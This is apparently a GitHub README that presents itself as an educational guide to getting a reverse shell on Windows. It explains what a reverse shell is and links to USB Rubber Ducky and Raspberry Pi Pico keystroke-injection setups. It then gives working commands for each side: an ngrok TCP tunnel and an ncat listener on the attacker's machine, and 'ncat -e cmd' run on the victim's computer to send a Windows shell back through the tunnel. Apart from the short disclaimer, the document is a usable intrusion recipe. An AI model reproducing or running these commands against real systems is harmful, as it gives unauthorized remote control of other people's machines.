# Reverse-Shell
This is a guide on how to perform a reverse shell on Windows.

> ⚠ This repository is ONLY for educational purpose

❓ **How Reverse Shell Works**
- In a typical remote system access scenario, the user is the client and the target machine is the server. The user initiates a remote shell connection and the target      system listens for such connections. With a reverse shell, the roles are opposite. It is the target machine that initiates the connection to the user, and the user’s    computer listens for incoming connections on a specified port.

> ⚠ ATTENTION ⚠

- This repository does NOT explain how to set a [Raspberry Pi Pico](https://www.amazon.it/IBest-Pico-Microcontroller-Board-Pre-Soldered/dp/B0922F9VYT/ref=sr_1_1_sspa?__mk_it_IT=%C3%85M%C3%85%C5%BD%C3%95%C3%91&crid=23WS773UDH0WZ&keywords=rasberry%2Bpi%2Bpico&qid=1664023352&qu=eyJxc2MiOiIzLjcyIiwicXNhIjoiMy4yMiIsInFzcCI6IjIuNjEifQ%3D%3D&sprefix=rasberry%2Bpi%2Bpico%2Caps%2C105&sr=8-1-spons&spLa=ZW5jcnlwdGVkUXVhbGlmaWVyPUExMjdRSFlKUEc3TDk0JmVuY3J5cHRlZElkPUEwOTgzNzkzM05VN0s2QTFDV05VVyZlbmNyeXB0ZWRBZElkPUEwOTE1NjQ1MkQ3UFIwM01QU1VHSyZ3aWRnZXROYW1lPXNwX2F0ZiZhY3Rpb249Y2xpY2tSZWRpcmVjdCZkb05vdExvZ0NsaWNrPXRydWU&th=1, "Buy a Raspberry Pi Pico") or a [USB Rubber Ducky](https://hak5.org/products/usb-rubber-ducky, "Buy a USB Rubber Ducky").

  - For set a raspberry pi pico or a USB Rubber Ducky: 
    - https://www.youtube.com/watch?v=e_f9p-_JWZw&t=949s&ab_channel=NetworkChuck
    - https://github.com/dbisu/pico-ducky

🧰 **Hacker's Computer**
 1. Download [Ngrok](https://ngrok.com/)
 2. Run ngrok on port `9999` 
    - ngrok tcp 9999
 3. Create a listener with [ncat](https://nmap.org/download.html) on another cmd
    - ncat -lvnp 9999
 
 🎯 **Victim's Computer**
 1. ncat -e cmd \<ngrok IP> \<ngrok PORT>
